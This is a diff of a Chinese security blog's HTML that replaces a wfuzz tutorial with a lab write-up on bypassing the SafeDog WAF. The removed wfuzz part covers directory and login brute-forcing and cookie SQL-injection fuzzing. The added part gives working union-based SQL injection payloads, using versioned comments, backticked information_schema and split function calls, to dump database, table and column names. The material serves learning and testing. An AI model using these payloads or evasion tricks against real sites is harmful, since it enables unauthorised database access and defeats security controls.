@@ -117,37 +117,36 @@
   };
 </script>
 
-  <meta name="description" content="wfuzz工具介绍wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试 wfuzz工具基本用法常用参数 12345678910111213141516171819202122232425262728293031323334要FUZZ的参数用FUZZ表示如果有3个就要这样第一个:FUZZ">
-<meta name="keywords" content="tools">
+  <meta name="description" content="实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&amp;#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返">
+<meta name="keywords" content="waf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="wfuzz工具">
-<meta property="og:url" content="http://cuokon.github.com/2019/08/28/wfuzz/index.html">
+<meta property="og:title" content="sql过狗(联合注入)">
+<meta property="og:url" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/index.html">
 <meta property="og:site_name" content="错空&#39;s Blog">
-<meta property="og:description" content="wfuzz工具介绍wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试 wfuzz工具基本用法常用参数 12345678910111213141516171819202122232425262728293031323334要FUZZ的参数用FUZZ表示如果有3个就要这样第一个:FUZZ">
+<meta property="og:description" content="实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&amp;#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/0.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/1.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/2.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/2.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/3.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/4.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/5.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/6.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/7.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/8.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/9.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/10.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/11.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/12.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/13.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/14.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/15.png">
-<meta property="og:image" content="http://cuokon.github.com/image/wfuzz/16.png">
-<meta property="og:updated_time" content="2019-08-28T23:24:43.781Z">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/2.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/3.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/4.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/5.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/6.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/8.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/9.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/10.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/11.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1570708378050.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/12.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/13.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/14.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/15.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/16.png">
+<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1570710091192.png">
+<meta property="og:updated_time" content="2019-10-10T12:23:05.413Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="wfuzz工具">
-<meta name="twitter:description" content="wfuzz工具介绍wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试 wfuzz工具基本用法常用参数 12345678910111213141516171819202122232425262728293031323334要FUZZ的参数用FUZZ表示如果有3个就要这样第一个:FUZZ">
-<meta name="twitter:image" content="http://cuokon.github.com/image/wfuzz/0.png">
+<meta name="twitter:title" content="sql过狗(联合注入)">
+<meta name="twitter:description" content="实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&amp;#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返">
+<meta name="twitter:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1.png">
 
 
 
@@ -155,7 +154,7 @@
 
   
   
-  <link rel="canonical" href="http://cuokon.github.com/2019/08/28/wfuzz/">
+  <link rel="canonical" href="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/">
 
 
 
@@ -166,7 +165,7 @@
 </script>
 
   
-  <title>wfuzz工具 | 错空's Blog</title>
+  <title>sql过狗(联合注入) | 错空's Blog</title>
   
 
 
@@ -402,7 +401,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://cuokon.github.com/2019/08/28/wfuzz/">
+    <link itemprop="mainEntityOfPage" href="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cuo kon">
@@ -419,7 +418,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">wfuzz工具
+          <h1 class="post-title" itemprop="name headline">sql过狗(联合注入)
 
               
             
@@ -445,7 +444,7 @@
                 
               
 
-              <time title="创建时间：2019-08-28 20:04:10" itemprop="dateCreated datePublished" datetime="2019-08-28T20:04:10+08:00">2019-08-28</time>
+              <time title="创建时间：2019-10-10 16:42:32 / 修改时间：20:23:05" itemprop="dateCreated datePublished" datetime="2019-10-10T16:42:32+08:00">2019-10-10</time>
             </span>
           
 
@@ -453,18 +452,23 @@
             
 
             
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-08-29 07:24:43" itemprop="dateModified" datetime="2019-08-29T07:24:43+08:00">2019-08-29</time>
-              </span>
-            
           
 
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/实战/" itemprop="url" rel="index"><span itemprop="name">实战</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -492,7 +496,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span title="本文字数">2.6k</span>
+              <span title="本文字数">1.7k</span>
             </span>
           
 
@@ -523,24 +527,35 @@
       
 
       
-        <h2 id="wfuzz工具介绍"><a href="#wfuzz工具介绍" class="headerlink" title="wfuzz工具介绍"></a>wfuzz工具介绍</h2><p>wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试</p>
-<h2 id="wfuzz工具基本用法"><a href="#wfuzz工具基本用法" class="headerlink" title="wfuzz工具基本用法"></a>wfuzz工具基本用法</h2><p>常用参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">要FUZZ的参数用FUZZ表示如果有3个就要这样</span><br><span class="line">第一个:FUZZ</span><br><span class="line">第二个:FUZ2Z</span><br><span class="line">第三个:FUZ3Z</span><br><span class="line">其他更多的参数以此类推</span><br><span class="line">payload的个数要与FUZZ的个数相等</span><br><span class="line">-c: 带颜色输出</span><br><span class="line">-z: payloads里面的参数(wfuzz -e payloads)常用的有</span><br><span class="line">		file,1.txt:加载1.txt文件,用文件内容作为payload</span><br><span class="line">		range,1-10:代表用1到10作为payload</span><br><span class="line">		list,1-2-3:代表用1,2,3作为参数。每个参数用-分割</span><br><span class="line">-d: 设置POST数据</span><br><span class="line">-b: 设置cookie头</span><br><span class="line">-H: 添加http头部</span><br><span class="line">-p: 代理(可以使用多个代理)</span><br><span class="line">-X: 请求方式</span><br><span class="line">-R: 设置递归深度</span><br><span class="line">-s: 设置超时时间</span><br><span class="line">-t: 设置线程</span><br><span class="line">-e: 编码</span><br><span class="line">-f: 保存</span><br><span class="line">–follow：遵循重定向</span><br><span class="line">--basic: Basic Auth</span><br><span class="line">下面的要设置多个值的话用,分割</span><br><span class="line">--hc: 不输出状态码等于你设置的状态码的响应包(比如设置为200,那就不会输出状态码等于200的包)</span><br><span class="line">--hl: 不输出行数等于你设置的行数的响应包</span><br><span class="line">--hw: 不输出字数等于你设置的字数的响应包</span><br><span class="line">--hh: 不输出字符数等于你设置的字符数的响应包</span><br><span class="line">--hs: 不输出响应包中包含你输入的字符串的响应包</span><br><span class="line">-sc: 输出状态码等于你设置的状态码的响应包</span><br><span class="line">--sl: 输出行数等于你设置的行数的响应包</span><br><span class="line">--sw: 输出字数等于你设置的字数的响应包</span><br><span class="line">--sh: 输出字符数等于你设置的字符数的响应包</span><br><span class="line">--ss: 输出响应包中包含你输入的字符串的响应包</span><br></pre></td></tr></table></figure>
+        <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>window server 2012: 安全狗4.0<br><img src="./images/1.png" alt="1"></p>
+<h3 id="过狗"><a href="#过狗" class="headerlink" title="过狗"></a>过狗</h3><p>首先第一步进行sql注入测试,在进行<code>1&#39; or 1=1</code>的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。<br>首先来了解一下基本的原理<br>一个字符串除0会返回NULL<br><img src="./images/2.png" alt="2"><br>一个字符串除大于0的数会返回0<br><img src="./images/3.png" alt="3"><br>一个字符串乘数字会大于0<br><img src="./images/4.png" alt="4"></p>
+<p>那根据上面测试的结果进行sql注入测试<br>返回了除了值等于NULL的数据<br><img src="./images/5.png" alt="5"><br>没有返回数据<br><img src="./images/6.png" alt="6"></p>
+<p>那来用来测试是否可以绕过安全狗<br><code>1&#39; or 1=1%23</code>被拦截<br><img src="./images/8.png" alt="8"><br><code>1&#39;/0%23</code>没有被拦截,返回空<br><img src="./images/9.png" alt="9"><br><code>1&#39;/1%23</code>没有被拦截,返回数据<br><img src="./images/10.png" alt="10"></p>
+<p>第二步猜测有多少个字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and order 不拦截</span><br><span class="line">1&apos; and by   不拦截</span><br><span class="line">1&apos; and order by 拦截</span><br></pre></td></tr></table></figure>
 
-<h3 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h3><p><img src="../../../../image/wfuzz/0.png" alt="0"><br>id:代表编号<br>Response: 代表返回状态码(C=404代表返回404状态码)<br>Lines: 代表返回的行数<br>Word: 代表返回的字数<br>Chars: 代表返回的字符数<br>payload: 代表发出去的payload</p>
-<h3 id="c参数"><a href="#c参数" class="headerlink" title="-c参数"></a>-c参数</h3><p>下面是一个无-c参数的<br><code>$ wfuzz -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ</code><br><img src="../../../../image/wfuzz/1.png" alt="1"><br>一个有-c参数的<br><code>wfuzz -c -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ</code><br><img src="../../../../image/wfuzz/2.png" alt="2"></p>
-<h3 id="z参数"><a href="#z参数" class="headerlink" title="-z参数"></a>-z参数</h3><p>把文件内容当做payload<br><code>wfuzz -c -z file,dir.txt http://172.16.5.2/FUZZ</code><br><img src="../../../../image/wfuzz/2.png" alt="2"><br>用rang来当做payload<br><code>wfuzz -c -z range,10-20 --hc 404 http://172.16.5.2/FUZZ</code><br><img src="../../../../image/wfuzz/3.png" alt="3"><br>用list来当做payload<br><code>wfuzz -c -z list,20-a-b-upload-login --hc 404 http://172.16.5.2/FUZZ</code><br><img src="../../../../image/wfuzz/4.png" alt="4"></p>
-<h3 id="d设置POST数据"><a href="#d设置POST数据" class="headerlink" title="-d设置POST数据"></a>-d设置POST数据</h3><p><code>wfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; http://172.16.5.2/</code><br><img src="../../../../image/wfuzz/5.png" alt="5"></p>
-<h3 id="b设置cookie"><a href="#b设置cookie" class="headerlink" title="-b设置cookie"></a>-b设置cookie</h3><p>设置2个cookie,其中一个是user还有一个是passwd<br><code>wfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; -b &quot;user=test&quot; -b &quot;passwd=test&quot; http://172.16.5.2/</code><br><img src="../../../../image/wfuzz/6.png" alt="6"><br>设置多个cookie要用多个-b</p>
-<h3 id="X参数设置请求方法"><a href="#X参数设置请求方法" class="headerlink" title="-X参数设置请求方法"></a>-X参数设置请求方法</h3><p><code>wfuzz -c -z list,GET-POST-HEAD -X FUZZ http://172.16.5.2/</code><br><img src="../../../../image/wfuzz/7.png" alt="7"></p>
-<h3 id="p设置代理"><a href="#p设置代理" class="headerlink" title="-p设置代理"></a>-p设置代理</h3><p><code>wfuzz -c -z list,20-a-b-upload-login -p 127.0.0.1:SOCKS4,127.0.0.1:SOCKS5  http://172.16.5.2/</code><br><img src="../../../../image/wfuzz/8.png" alt="8"></p>
-<h3 id="t设置线程"><a href="#t设置线程" class="headerlink" title="-t设置线程"></a>-t设置线程</h3><p><code>wfuzz -c -z list,20-a-b-upload-login -t 30  http://172.16.5.2/</code><br><img src="../../../../image/wfuzz/9.png" alt="9"></p>
-<h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><p><code>wfuzz -c -z file,dir.txt --sc 403,200,304 http://172.16.5.2/FUZZ</code><br><img src="../../../../image/wfuzz/10.png" alt="10"></p>
-<h3 id="爆破文件"><a href="#爆破文件" class="headerlink" title="爆破文件"></a>爆破文件</h3><p><code>wfuzz -c -z file,dir.txt --sc 200,304 http://172.16.5.2/FUZZ.php</code><br><img src="../../../../image/wfuzz/11.png" alt="11"></p>
-<h3 id="爆破账号密码"><a href="#爆破账号密码" class="headerlink" title="爆破账号密码"></a>爆破账号密码</h3><p>第一种爆破(一个字典对应一个字典)<br><code>wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php</code><br><img src="../../../../image/wfuzz/12.png" alt="12"><br>第二种爆破(一个字典中的一个值直接对应另外一个字典的所有值)<br><code>wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php</code><br><img src="../../../../image/wfuzz/13.png" alt="13"></p>
-<h3 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h3><p>保存html文件<br><code>wfuzz -c -z file,dir.txt -f 1,html http://172.16.5.96/FUZZ</code><br><img src="../../../../image/wfuzz/14.png" alt="14"></p>
-<h3 id="对payload加密"><a href="#对payload加密" class="headerlink" title="对payload加密"></a>对payload加密</h3><p> <code>wfuzz -z list,a-b-c-admin,base64 -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php</code><br> <img src="../../../../image/wfuzz/15.png" alt="15"></p>
-<h3 id="对cookie进行sql注入测试"><a href="#对cookie进行sql注入测试" class="headerlink" title="对cookie进行sql注入测试"></a>对cookie进行sql注入测试</h3><p> <code>wfuzz -z file,MSSQL.fuzz.txt -b &quot;sql=FUZZ&quot; http://172.16.5.96/login/login.php</code><br> <img src="../../../../image/wfuzz/16.png" alt="16"></p>
+<p>可以用<code>/*!10244by*/</code>,来绕过,10244是通过fuzz得来的,图片的数字基本上都可以,可能大家想问为什么不用为什么不用<code>/*!10244order*/</code>呢,因为我没有成功。:(<br><img src="./images/11.png" alt="11"><br>输入<code>a&#39;  and order /*!10244by*/3%23</code>,发现没有拦截<br><img src="./images/1570708378050.png" alt="enter description here"></p>
+<p>然后查看有效字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union 不拦截</span><br><span class="line">1&apos; select 不拦截</span><br><span class="line">1&apos; union select 拦截</span><br></pre></td></tr></table></figure>
+
+<p>可以用<code>/*!1024select*/</code>来绕过<br>输入<code>1&#39; union /*!10244select*/ 1,2,3%23</code>,发现没有被拦截<br><img src="./images/12.png" alt="12"><br>然后爆数据库,因为他会匹配database()函数,所以<code>database/**/()</code>,不过这样也会被拦截,在看404大佬的bypass的时候是用<code>hex(database/**/())</code>来得到数据库名的16进制的,不过我测试发现用<code>(database/**/())</code>就可以了<br>利用hex获取数据库的16进制<br><img src="./images/13.png" alt="13"><br>直接获取数据库名<br><img src="./images/14.png" alt="14"></p>
+<p>获取数据库表的信息<br>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,select group_concat(table_name) from information_schema.tables where table_schema=(database/**/()),3%23;</span><br></pre></td></tr></table></figure>
+
+<p>然后发现会被拦截,经过测试发现拦截的是information_schema这个关键字,我们可以加上``符号,来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(table_name) from `information_schema`.tables where table_schema=(database/**/())),3%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="./images/15.png" alt="15"></p>
+<p>爆破列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and table_name=&apos;user&apos;),3%23</span><br></pre></td></tr></table></figure>
+
+<p>发现被拦截了,经过测试是在table_name=’user’这里被拦截,我们依然可以用``进行绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23</span><br></pre></td></tr></table></figure>
+
+<p>发现被拦截了,然后尝试吧class转换为hex在进行绕过<br><img src="./images/16.png" alt="16"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="./images/1570710091192.png" alt="enter description here"></p>
 
       
     </div>
@@ -582,7 +597,7 @@
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     
-    <a href="http://cuokon.github.com/2019/08/28/wfuzz/" title="wfuzz工具">http://cuokon.github.com/2019/08/28/wfuzz/</a>
+    <a href="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/" title="sql过狗(联合注入)">http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -598,7 +613,7 @@
         
         <div class="post-tags">
           
-            <a href="/tags/tools/" rel="tag"># tools</a>
+            <a href="/tags/waf/" rel="tag"># waf</a>
           
         </div>
       
@@ -611,8 +626,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/25/cobaltstrike(一)/" rel="next" title="cobaltstrike(一)">
-                <i class="fa fa-chevron-left"></i> cobaltstrike(一)
+              <a href="/2019/10/09/i春秋ctf(1)/" rel="next" title="i春秋ctf题目(1)">
+                <i class="fa fa-chevron-left"></i> i春秋ctf题目(1)
               </a>
             
           </div>
@@ -620,10 +635,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/28/redis/" rel="prev" title="8/28(redis未授权,xctf)">
-                8/28(redis未授权,xctf) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -857,7 +868,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#wfuzz工具介绍"><span class="nav-number">1.</span> <span class="nav-text">wfuzz工具介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wfuzz工具基本用法"><span class="nav-number">2.</span> <span class="nav-text">wfuzz工具基本用法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#界面介绍"><span class="nav-number">2.1.</span> <span class="nav-text">界面介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c参数"><span class="nav-number">2.2.</span> <span class="nav-text">-c参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#z参数"><span class="nav-number">2.3.</span> <span class="nav-text">-z参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#d设置POST数据"><span class="nav-number">2.4.</span> <span class="nav-text">-d设置POST数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b设置cookie"><span class="nav-number">2.5.</span> <span class="nav-text">-b设置cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#X参数设置请求方法"><span class="nav-number">2.6.</span> <span class="nav-text">-X参数设置请求方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#p设置代理"><span class="nav-number">2.7.</span> <span class="nav-text">-p设置代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#t设置线程"><span class="nav-number">2.8.</span> <span class="nav-text">-t设置线程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实用技巧"><span class="nav-number">3.</span> <span class="nav-text">实用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破目录"><span class="nav-number">3.1.</span> <span class="nav-text">爆破目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破文件"><span class="nav-number">3.2.</span> <span class="nav-text">爆破文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破账号密码"><span class="nav-number">3.3.</span> <span class="nav-text">爆破账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#保存文件"><span class="nav-number">3.4.</span> <span class="nav-text">保存文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对payload加密"><span class="nav-number">3.5.</span> <span class="nav-text">对payload加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对cookie进行sql注入测试"><span class="nav-number">3.6.</span> <span class="nav-text">对cookie进行sql注入测试</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过狗"><span class="nav-number">2.</span> <span class="nav-text">过狗</span></a></li></ol></div>
             
 
           </div>
@@ -1102,7 +1113,7 @@
 
 <script>
   window.livereOptions = {
-    refer: '2019/08/28/wfuzz/'
+    refer: '2019/10/10/sql过狗(联合注入)/'
   };
   (function(d, s) {
     var j, e = d.getElementsByTagName(s)[0];
